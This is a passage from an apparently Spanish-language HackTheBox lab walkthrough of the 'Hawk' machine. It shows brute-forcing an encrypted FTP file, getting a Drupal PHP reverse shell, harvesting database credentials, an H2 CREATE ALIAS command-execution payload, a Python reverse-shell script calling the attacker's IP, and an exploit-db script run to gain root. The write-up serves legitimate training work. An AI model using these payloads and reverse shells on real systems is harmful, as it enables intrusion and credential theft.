Remote system <span class="nb">type </span>is UNIX.
Using binary mode to transfer files.
ftp&gt; <span class="nb">dir
</span>229 Entering Extended Passive Mode <span class="o">(||</span>|46148|<span class="o">)</span>
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jun 16  2018 messages
226 Directory send OK.
ftp&gt; <span class="nb">cd </span>messages
250 Directory successfully changed.
ftp&gt; <span class="nb">dir
</span>229 Entering Extended Passive Mode <span class="o">(||</span>|45380|<span class="o">)</span>
150 Here comes the directory listing.
226 Directory send OK.
ftp&gt;
</code></pre></div></div>

<ul>
  <li>Sin embargo podemos ver archivos ocultos dentro de <code class="language-plaintext highlighter-rouge">messages</code> vemos un <code class="language-plaintext highlighter-rouge">.enc</code> <a href="https://www.reviversoft.com/es/file-extensions/enc?alid=547807047.1719962381">https://www.reviversoft.com/es/file-extensions/enc?alid=547807047.1719962381</a> en conclusi√≥n es un archivo cifrado.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp&gt; <span class="nb">ls</span> <span class="nt">-a</span>
229 Entering Extended Passive Mode <span class="o">(||</span>|43596|<span class="o">)</span>
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Jun 16  2018 <span class="nb">.</span>
drwxr-xr-x    3 ftp      ftp          4096 Jun 16  2018 ..
<span class="nt">-rw-r--r--</span>    1 ftp      ftp           240 Jun 16  2018 .drupal.txt.enc
226 Directory send OK.
ftp&gt; get .drupal.txt.enc
<span class="nb">local</span>: .drupal.txt.enc remote: .drupal.txt.enc
229 Entering Extended Passive Mode <span class="o">(||</span>|48850|<span class="o">)</span>
150 Opening BINARY mode data connection <span class="k">for</span> .drupal.txt.enc <span class="o">(</span>240 bytes<span class="o">)</span><span class="nb">.</span>
100% |<span class="k">***************************************************************************</span>|   240        2.60 MiB/s    00:00 ETA
226 Transfer complete.
240 bytes received <span class="k">in </span>00:00 <span class="o">(</span>2.26 KiB/s<span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Si vemos mas informaci√≥n nos habla sobre <code class="language-plaintext highlighter-rouge">openssl</code> adem√°s que se utilizo una contrase√±a con salt para el proceso de cifrado y los datos se codificaron en <code class="language-plaintext highlighter-rouge">base64</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ file .drupal.txt.enc
.drupal.txt.enc: openssl enc<span class="s1">'d data with salted password, base64 encoded
</span></code></pre></div></div>

<ul>
  <li>Como no conocemos la contrase√±a se vuelve mas complejo sin embargo hoy en d√≠a existen herramientas las cuales pueden aplicar fuerza bruta para saber la contrase√±a <a href="https://github.com/deltaclock/go-openssl-bruteforce">https://github.com/deltaclock/go-openssl-bruteforce</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ git clone https://github.com/deltaclock/go-openssl-bruteforce.git
Cloning into <span class="s1">'go-openssl-bruteforce'</span>...
remote: Enumerating objects: 31, <span class="k">done</span><span class="nb">.</span>
remote: Total 31 <span class="o">(</span>delta 0<span class="o">)</span>, reused 0 <span class="o">(</span>delta 0<span class="o">)</span>, pack-reused 31
Receiving objects: 100% <span class="o">(</span>31/31<span class="o">)</span>, 1.72 MiB | 2.84 MiB/s, <span class="k">done</span><span class="nb">.</span>
Resolving deltas: 100% <span class="o">(</span>13/13<span class="o">)</span>, <span class="k">done</span><span class="nb">.</span>
‚ùØ <span class="nb">cd </span>go-openssl-bruteforce
‚ùØ go mod tidy
‚ùØ go build <span class="nt">-o</span> openssl-brute
</code></pre></div></div>

<ul>
  <li>Ahora le pasamos el archivo y nos da la contrase√±a y el algoritmo con el cual fue encriptado.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ ./openssl-brute <span class="nt">--file</span> .drupal.txt.enc
Bruteforcing Started
CRACKED!! Results <span class="k">in </span>file <span class="o">[</span> result-aes256 <span class="o">]</span>
<span class="nt">--------------------------------------------------</span>
Found password <span class="o">[</span> friends <span class="o">]</span> using <span class="o">[</span> aes256 <span class="o">]</span> algorithm!!
<span class="nt">--------------------------------------------------</span>
Daniel,

Following the password <span class="k">for </span>the portal:

PencilKeyboardScanner123

Please <span class="nb">let </span>us know when the portal is ready.

Kind Regards,

IT department

<span class="nt">--------------------------------------------------</span>
</code></pre></div></div>

<ul>
  <li>Podemos probar a conectarnos por ssh pero no nos deja.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ <span class="nb">cat </span>creds.txt
Daniel:PencilKeyboardScanner123
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ ssh daniel@10.10.10.102
The authenticity of host <span class="s1">'10.10.10.102 (10.10.10.102)'</span> can<span class="s1">'t be established.
ED25519 key fingerprint is SHA256:jcuqa44g/a1pFArv7e9IFSswe7plzlg2gNBVim3xXhY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span>10.10.10.102<span class="s1">' (ED25519) to the list of known hosts.
daniel@10.10.10.102'</span>s password:
Permission denied, please try again.
daniel@10.10.10.102<span class="s1">'s password:
Permission denied, please try again.
daniel@10.10.10.102'</span>s password:
daniel@10.10.10.102: Permission denied <span class="o">(</span>publickey,password<span class="o">)</span><span class="nb">.</span>
</code></pre></div></div>

<h2 id="drupal">Drupal</h2>

<ul>
  <li>Nos hablan sobre un portal lo mas probable es que se refiera al Drupal 7 que vimos con Nmap.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hawk/1.png" />
</p>

<ul>
  <li>Si nos conectamos con la contrase√±a que vimos nos deja y como username usamos Admin.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hawk/2.png" />
</p>

<ul>
  <li>Podemos ir a Modules y en este caso como somos usuarios administradores podemos habilitar Path y PHP filter.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hawk/3.png" />
</p>

<ul>
  <li>Vamos a√±adir contenido.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hawk/4.png" />
</p>

<ul>
  <li>Damos Click en Basic Page.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hawk/5.png" />
</p>

<ul>
  <li>Vamos a ver si el PHP lo interpreta en Text format indicamos que es PHP code.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hawk/6.png" />
</p>

<ul>
  <li>Y vemos esto.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hawk/7.png" />
</p>

<h2 id="shell-as-www-data">Shell as www-data</h2>

<ul>
  <li>Vamos a enviarnos una reverse shell.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ nc <span class="nt">-nlvp</span> 433
listening on <span class="o">[</span>any] 433 ...
</code></pre></div></div>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hawk/8.png" />
</p>

<ul>
  <li>Al darle a Save nos llega la shell.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ nc <span class="nt">-nlvp</span> 433
listening on <span class="o">[</span>any] 433 ...
connect to <span class="o">[</span>10.10.14.63] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.102] 53012
/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
$ whoami
www-data
</span></code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>script /dev/null <span class="nt">-c</span> bash
Script started, file is /dev/null
www-data@hawk:/var/www/html<span class="nv">$ </span>^Z
<span class="o">[</span>1]  + 25347 suspended  nc <span class="nt">-nlvp</span> 433
‚ùØ <span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
<span class="o">[</span>1]  + 25347 continued  nc <span class="nt">-nlvp</span> 433
                                    reset xterm
ENTER
www-data@hawk:/var/www/html<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
</code></pre></div></div>

<h2 id="shell-as-daniel-and-user-flag">Shell as Daniel and User flag</h2>

<ul>
  <li>Vemos la flag en el directorio de Daniel.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@hawk:/home/daniel<span class="nv">$ </span><span class="nb">cat </span>user.txt
3c9bfe74f2f6661740425db2ac4f0c08
www-data@hawk:/home/daniel<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>Vemos una contrase√±a en los archivos de configuraci√≥n.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@hawk:/var/www/html/sites/default<span class="nv">$ </span><span class="nb">cat </span>settings.php | <span class="nb">grep </span>password
 <span class="k">*</span>   <span class="s1">'password'</span> <span class="o">=&gt;</span> <span class="s1">'password'</span>,
 <span class="k">*</span> username, password, host, and database name.
 <span class="k">*</span>   <span class="s1">'password'</span> <span class="o">=&gt;</span> <span class="s1">'password'</span>,
 <span class="k">*</span>   <span class="s1">'password'</span> <span class="o">=&gt;</span> <span class="s1">'password'</span>,
 <span class="k">*</span>     <span class="s1">'password'</span> <span class="o">=&gt;</span> <span class="s1">'password'</span>,
 <span class="k">*</span>     <span class="s1">'password'</span> <span class="o">=&gt;</span> <span class="s1">'password'</span>,
      <span class="s1">'password'</span> <span class="o">=&gt;</span> <span class="s1">'drupal4hawk'</span>,
 <span class="k">*</span> by using the username and password variables. The proxy_user_agent variable
<span class="c"># $conf['proxy_password'] = '';</span>
</code></pre></div></div>

<ul>
  <li>Si migramos a Daniel se nos ejecuta python3.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@hawk:/var/www/html/sites/default<span class="nv">$ </span>su daniel
Password:
Python 3.6.5 <span class="o">(</span>default, Apr  1 2018, 05:46:30<span class="o">)</span>
<span class="o">[</span>GCC 7.3.0] on linux
Type <span class="s2">"help"</span>, <span class="s2">"copyright"</span>, <span class="s2">"credits"</span> or <span class="s2">"license"</span> <span class="k">for </span>more information.
<span class="o">&gt;&gt;&gt;</span>
</code></pre></div></div>

<ul>
  <li>Podemos ejecutar una bash.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;&gt;&gt;</span> import os
<span class="o">&gt;&gt;&gt;</span> os.system<span class="o">(</span><span class="s2">"/bin/bash"</span><span class="o">)</span>
daniel@hawk:/var/www/html/sites/default<span class="nv">$ </span><span class="nb">whoami
</span>daniel
daniel@hawk:/var/www/html/sites/default<span class="err">$</span>
</code></pre></div></div>

<ul>
  <li>Tambi√©n funcionan por SSH.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ ssh daniel@10.10.10.102
daniel@10.10.10.102<span class="s1">'s password:
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-23-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Jul  3 00:17:56 UTC 2024

  System load:  0.0               Processes:           176
  Usage of /:   47.5% of 7.32GB   Users logged in:     0
  Memory usage: 44%               IP address for eth0: 10.10.10.102
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

417 packages can be updated.
268 updates are security updates.


Last login: Sun Jul  1 13:46:16 2018 from dead:beef:2::1004
Python 3.6.5 (default, Apr  1 2018, 05:46:30)
[GCC 7.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
&gt;&gt;&gt; os.system("/bin/bash")
daniel@hawk:~$
</span></code></pre></div></div>

<h2 id="escalada-de-privilegios">Escalada de privilegios</h2>

<ul>
  <li>Como estamos ante un Drupal podemos ver mas usuarios y sus hashes conect√°ndonos al servicio de la base de datos la misma password para Daniel funciona.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>daniel@hawk:/var/www/html/sites/default<span class="nv">$ </span>mysql <span class="nt">-u</span> drupal <span class="nt">-p</span>
Enter password:
Welcome to the MySQL monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span><span class="nb">.</span>
Your MySQL connection <span class="nb">id </span>is 73
Server version: 5.7.22-0ubuntu18.04.1 <span class="o">(</span>Ubuntu<span class="o">)</span>

Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2018, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type <span class="s1">'help;'</span> or <span class="s1">'\h'</span> <span class="k">for </span>help. Type <span class="s1">'\c'</span> to clear the current input statement.

mysql&gt;
</code></pre></div></div>

<ul>
  <li>Vemos el hash del admin.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql&gt; show databases<span class="p">;</span>
+--------------------+
| Database           |
+--------------------+
| information_schema |
| drupal             |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>

mysql&gt; use drupal<span class="p">;</span>
Reading table information <span class="k">for </span>completion of table and column names
You can turn off this feature to get a quicker startup with <span class="nt">-A</span>

Database changed
mysql&gt; show tables<span class="p">;</span>
+-----------------------------+
| Tables_in_drupal            |
+-----------------------------+
| actions                     |
| authmap                     |
| batch                       |
| block                       |
| block_custom                |
| block_node_type             |
| block_role                  |
| blocked_ips                 |
| cache                       |
| cache_block                 |
| cache_bootstrap             |
| cache_field                 |
| cache_filter                |
| cache_form                  |
| cache_image                 |
| cache_menu                  |
| cache_page                  |
| cache_path                  |
| comment                     |
| date_format_locale          |
| date_format_type            |
| date_formats                |
| field_config                |
| field_config_instance       |
| field_data_body             |
| field_data_comment_body     |
| field_data_field_image      |
| field_data_field_tags       |
| field_revision_body         |
| field_revision_comment_body |
| field_revision_field_image  |
| field_revision_field_tags   |
| file_managed                |
| file_usage                  |
| filter                      |
| filter_format               |
| flood                       |
| <span class="nb">history</span>                     |
| image_effects               |
| image_styles                |
| menu_custom                 |
| menu_links                  |
| menu_router                 |
| node                        |
| node_access                 |
| node_comment_statistics     |
| node_revision               |
| node_type                   |
| queue                       |
| rdf_mapping                 |
| registry                    |
| registry_file               |
| role                        |
| role_permission             |
| search_dataset              |
| search_index                |
| search_node_links           |
| search_total                |
| semaphore                   |
| sequences                   |
| sessions                    |
| shortcut_set                |
| shortcut_set_users          |
| system                      |
| taxonomy_index              |
| taxonomy_term_data          |
| taxonomy_term_hierarchy     |
| taxonomy_vocabulary         |
| url_alias                   |
| <span class="nb">users</span>                       |
| users_roles                 |
| variable                    |
| watchdog                    |
+-----------------------------+
73 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>

mysql&gt; <span class="k">select</span> <span class="k">*</span> from <span class="nb">users</span><span class="p">;</span>
+-----+-------+---------------------------------------------------------+------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------+----------+---------+------------------+--------------------------+
| uid | name  | pass                                                    | mail             | theme | signature | signature_format | created    | access     | login      | status | timezone      | language | picture | init             | data                     |
+-----+-------+---------------------------------------------------------+------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------+----------+---------+------------------+--------------------------+
|   0 |       |                                                         |                  |       |           | NULL             |          0 |          0 |          0 |      0 | NULL          |          |       0 |                  | NULL                     |
|   1 | admin | <span class="nv">$S$DFw163ixD00W55hdCqtvCB13XOTLhZ0pt0FVpFy1Ntmdp5EAOX08</span> | admin@hawk.local |       |           | filtered_html    | 1528733367 | 1719965351 | 1719964196 |      1 | Europe/London |          |       0 | admin@hawk.local | a:1:<span class="o">{</span>s:7:<span class="s2">"overlay"</span><span class="p">;</span>i:1<span class="p">;</span><span class="o">}</span> |
+-----+-------+---------------------------------------------------------+------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------+----------+---------+------------------+--------------------------+
2 rows <span class="k">in </span><span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>
</code></pre></div></div>

<blockquote>
  <p>La contrase√±a no esta en el rockyou.txt.</p>
</blockquote>

<ul>
  <li>Vemos el pkexec pero no lo vamos a explotar.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>daniel@hawk:/<span class="nv">$ </span>find <span class="se">\-</span>perm <span class="nt">-4000</span> 2&gt;/dev/null | <span class="nb">grep</span> <span class="nt">-vE</span> <span class="s2">"snap"</span>
./bin/ping
./bin/fusermount
./bin/su
./bin/ntfs-3g
./bin/mount
./bin/umount
./usr/lib/eject/dmcrypt-get-device
./usr/lib/openssh/ssh-keysign
./usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
./usr/lib/policykit-1/polkit-agent-helper-1
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/bin/chfn
./usr/bin/passwd
./usr/bin/newgidmap
./usr/bin/chsh
./usr/bin/newgrp
./usr/bin/at
./usr/bin/gpasswd
./usr/bin/pkexec
./usr/bin/sudo
./usr/bin/newuidmap
./usr/bin/traceroute6.iputils
</code></pre></div></div>

<ul>
  <li>El puerto 8082 esta abierto el cual esta corriendo  H2 database http console como vimos en Nmap <a href="https://www.h2database.com/html/quickstart.html">https://www.h2database.com/html/quickstart.html</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>daniel@hawk:/<span class="nv">$ </span>netstat <span class="nt">-nat</span>
Active Internet connections <span class="o">(</span>servers and established<span class="o">)</span>
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 127.0.0.1:3306          0.0.0.0:<span class="k">*</span>               LISTEN
tcp        0      0 127.0.0.53:53           0.0.0.0:<span class="k">*</span>               LISTEN
tcp        0      0 0.0.0.0:22              0.0.0.0:<span class="k">*</span>               LISTEN
tcp        0      2 10.10.10.102:53012      10.10.14.63:433         ESTABLISHED
tcp6       0      0 :::9092                 :::<span class="k">*</span>                    LISTEN
tcp6       0      0 :::80                   :::<span class="k">*</span>                    LISTEN
tcp6       0      0 :::8082                 :::<span class="k">*</span>                    LISTEN
tcp6       0      0 :::21                   :::<span class="k">*</span>                    LISTEN
tcp6       0      0 :::22                   :::<span class="k">*</span>                    LISTEN
tcp6       0      0 :::5435                 :::<span class="k">*</span>                    LISTEN
tcp6       0      0 10.10.10.102:80         10.10.14.63:52754       ESTABLISHED
</code></pre></div></div>

<ul>
  <li>
    <p>Vamos hacer Port Forwarding para ver que es.</p>
  </li>
  <li>
    <p>Bueno si lo hago por SSH me da un error.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ ssh daniel@10.10.10.102 <span class="nt">-L</span> 8082:localhost:8082
daniel@10.10.10.102<span class="s1">'s password:
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-23-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Jul  3 00:35:55 UTC 2024

  System load:  0.01              Processes:           177
  Usage of /:   47.5% of 7.32GB   Users logged in:     0
  Memory usage: 68%               IP address for eth0: 10.10.10.102
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

417 packages can be updated.
268 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
</span></code></pre></div></div>

<ul>
  <li>Vamos a usar chisel <a href="https://github.com/jpillora/chisel">https://github.com/jpillora/chisel</a>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ ./chisel_1.9.1_linux_amd64 server <span class="nt">-p</span> 8000 <span class="nt">--reverse</span>
2024/07/02 18:38:36 server: Reverse tunnelling enabled
2024/07/02 18:38:36 server: Fingerprint <span class="nv">p1HWvBEOgawHr1W0leahUeW7u9yV9XBtPOme4dn1lOE</span><span class="o">=</span>
2024/07/02 18:38:36 server: Listening on http://0.0.0.0:8000
</code></pre></div></div>

<ul>
  <li>Ejecutamos esto en la m√°quina victima.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>daniel@hawk:/tmp<span class="nv">$ </span>./chisel_1.9.1_linux_amd64 client http://10.10.14.63:8000 R:8082:127.0.0.1:8082
</code></pre></div></div>

<ul>
  <li>Vemos esto.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hawk/9.png" />
</p>

<ul>
  <li>Si buscamos vulnerabilidades vemos Remote Code Execution.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ searchsploit H2 database

<span class="nt">--------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
 Exploit Title                                                                                    |  Path
<span class="nt">--------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
H2 Database - <span class="s1">'Alias'</span> Arbitrary Code Execution                                                    | java/local/44422.py
H2 Database 1.4.196 - Remote Code Execution                                                       | java/webapps/45506.py
H2 Database 1.4.197 - Information Disclosure                                                      | linux/webapps/45105.py
H2 Database 1.4.199 - JNI Code Execution                                                          | java/local/49384.txt
Oracle Database 10 g - XML DB xdb.xdb_pitrig_pkg Package PITRIG_TRUNCATE Function Overflow        | multiple/remote/31010.sql
<span class="nt">--------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
</code></pre></div></div>

<ul>
  <li>Si podemos cualquier nombre en <code class="language-plaintext highlighter-rouge">JDBC</code> Url como /testing y nos conectamos sin contrase√±a funciona.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hawk/10.png" />
</p>

<ul>
  <li>
    <p>Podemos obtener RCE <a href="https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html">https://mthbernardes.github.io/rce/2018/03/14/abusing-h2-database-alias.html</a>.</p>
  </li>
  <li>
    <p>Estamos como root.</p>
  </li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hawk/11.png" />
</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>CREATE ALIAS SHELLEXEC AS <span class="nv">$$</span> String shellexec<span class="o">(</span>String cmd<span class="o">)</span> throws java.io.IOException <span class="o">{</span> java.util.Scanner s <span class="o">=</span> new
java.util.Scanner<span class="o">(</span>Runtime.getRuntime<span class="o">()</span>.exec<span class="o">(</span>cmd<span class="o">)</span>.getInputStream<span class="o">())</span>.useDelimiter<span class="o">(</span><span class="s2">"</span><span class="se">\\</span><span class="s2">A"</span><span class="o">)</span><span class="p">;</span> <span class="k">return </span>s.hasNext<span class="o">()</span> ? s.next<span class="o">()</span> : <span class="s2">""</span><span class="p">;</span> <span class="o">}</span><span class="nv">$$</span><span class="p">;</span>
CALL SHELLEXEC<span class="o">(</span><span class="s1">'id'</span><span class="o">)</span>
</code></pre></div></div>

<ul>
  <li>Usaremos el siguiente script para recibir la reverse shell.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ <span class="nb">cat </span>reverse.py
import socket
import subprocess
import os

s <span class="o">=</span> socket.socket<span class="o">(</span>socket.AF_INET, socket.SOCK_STREAM<span class="o">)</span>
s.connect<span class="o">((</span><span class="s2">"10.10.14.63"</span>, 8080<span class="o">))</span>
os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>, 0<span class="o">)</span>
os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>, 1<span class="o">)</span>
os.dup2<span class="o">(</span>s.fileno<span class="o">()</span>, 2<span class="o">)</span>
subprocess.call<span class="o">([</span><span class="s2">"/bin/sh"</span>, <span class="s2">"-i"</span><span class="o">])</span>
</code></pre></div></div>

<ul>
  <li>Vamos a meter eso en /tmp.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>daniel@hawk:/tmp<span class="nv">$ </span><span class="nb">chmod</span> +x reverse.py
</code></pre></div></div>

<ul>
  <li>Nos ponemos en escucha.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ nc <span class="nt">-nlvp</span> 8080
listening on <span class="o">[</span>any] 8080 ...
</code></pre></div></div>

<ul>
  <li>Y ejecutamos solo que ahora ejecutamos python3 y la ruta del archivo en python3.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/medium/hawk/12.png" />
</p>

<h2 id="roottxt">root.txt</h2>

<ul>
  <li>Al darle a run nos llega la shell como root.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ nc <span class="nt">-nlvp</span> 8080
listening on <span class="o">[</span>any] 8080 ...
connect to <span class="o">[</span>10.10.14.63] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.102] 40912
/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
# whoami
root
# script /dev/null -c bash
Script started, file is /dev/null
root@hawk:~# cat /root/root.txt
cat /root/root.txt
5aa913cca6cd0865e7172edbc21d66f4
root@hawk:~#
</span></code></pre></div></div>

<h2 id="second-way">Second way</h2>

<ul>
  <li>Como vimos antes hay un script que tambi√©n nos da RCE.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ searchsploit H2 database

<span class="nt">-----------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
 Exploit Title                                                                                                   |  Path
<span class="nt">-----------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
H2 Database - <span class="s1">'Alias'</span> Arbitrary Code Execution                                                                   | java/local/44422.py
H2 Database 1.4.196 - Remote Code Execution                                                                      | java/webapps/45506.py
H2 Database 1.4.197 - Information Disclosure                                                                     | linux/webapps/45105.py
H2 Database 1.4.199 - JNI Code Execution                                                                         | java/local/49384.txt
Oracle Database 10 g - XML DB xdb.xdb_pitrig_pkg Package PITRIG_TRUNCATE Function Overflow                       | multiple/remote/31010.sql
<span class="nt">-----------------------------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
Shellcodes: No Results
‚ùØ searchsploit <span class="nt">-m</span> 45506

  Exploit: H2 Database 1.4.196 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/45506
     Path: /usr/share/exploitdb/exploits/java/webapps/45506.py
    Codes: N/A
 Verified: False
File Type: Python script, Unicode text, UTF-8 text executable
Copied to: /home/miguel/Downloads/45506.py
</code></pre></div></div>

<ul>
  <li>Lo descargamos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>daniel@hawk:/tmp<span class="nv">$ </span>wget http://10.10.14.63/45506.py
<span class="nt">--2024-07-03</span> 01:08:30--  http://10.10.14.63/45506.py
Connecting to 10.10.14.63:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3756 <span class="o">(</span>3.7K<span class="o">)</span> <span class="o">[</span>text/x-python]
Saving to: ‚Äò45506.py‚Äô

45506.py                         100%[<span class="o">==========================================================&gt;]</span>   3.67K  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0.003s

2024-07-03 01:08:30 <span class="o">(</span>1.14 MB/s<span class="o">)</span> - ‚Äò45506.py‚Äô saved <span class="o">[</span>3756/3756]

daniel@hawk:/tmp<span class="nv">$ </span><span class="nb">chmod </span>777 45506.py
</code></pre></div></div>

<ul>
  <li>Ejecutamos.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>daniel@hawk:/tmp<span class="nv">$ </span>python3 45506.py <span class="nt">--host</span> 127.0.0.1:8082
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Attempting to create database
<span class="o">[</span>+] Created database and logged <span class="k">in</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending stage 1
<span class="o">[</span>+] Shell succeeded - ^c or quit to <span class="nb">exit
</span>h2-shell<span class="nv">$ </span><span class="nb">whoami
</span>root

h2-shell<span class="err">$</span>
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/medium" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">HackTheBox - Crafty (easy)</title><link href="http://localhost:4000/hackthebox/machines/easy/2024/06/26/crafty.html" rel="alternate" type="text/html" title="HackTheBox - Crafty (easy)" /><published>2024-06-26T00:00:00-06:00</published><updated>2024-06-26T00:00:00-06:00</updated><id>http://localhost:4000/hackthebox/machines/easy/2024/06/26/crafty</id><content type="html" xml:base="http://localhost:4000/hackthebox/machines/easy/2024/06/26/crafty.html"><![CDATA[<p align="center">
<img src="https://labs.hackthebox.com/storage/avatars/c01c8813bfc7795ae0717bbee7b407d1.png" />
</p>

<ul>
  <li>Crafty is an easy-difficulty Windows machine featuring the exploitation of a <code class="language-plaintext highlighter-rouge">Minecraft</code> server. Enumerating the version of the server reveals that it is vulnerable to pre-authentication Remote Code Execution (RCE), by abusing <code class="language-plaintext highlighter-rouge">Log4j Injection</code>. After obtaining a reverse shell on the target, enumerating the filesystem reveals that the administrator composed a Java-based <code class="language-plaintext highlighter-rouge">Minecraft</code> plugin, which when reverse engineered reveals <code class="language-plaintext highlighter-rouge">rcon</code> credentials. Those credentials are leveraged with the <code class="language-plaintext highlighter-rouge">RunAs</code> utility to gain Administrative access, compromising the system.</li>
</ul>

<h2 id="portscan">PortScan</h2>

<ul>
